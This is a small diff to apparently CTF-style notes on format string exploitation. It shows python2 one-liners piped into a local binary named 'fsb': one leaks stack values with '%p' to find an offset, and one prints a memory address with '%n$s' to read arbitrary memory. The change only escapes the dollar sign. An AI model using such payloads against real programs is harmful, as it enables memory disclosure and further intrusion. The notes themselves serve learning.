@@ -4,4 +4,4 @@ Exploit Example  -> python2 -c "print 'A'*4 + '%p'" | ./fsb
 : get a offset
 
 [+] Format String Exploit
-(python2 -c "print '{memory_address}' + '%n$s'") | ./fsb
+(python2 -c "print '{memory_address}' + '%n\$s'") | ./fsb
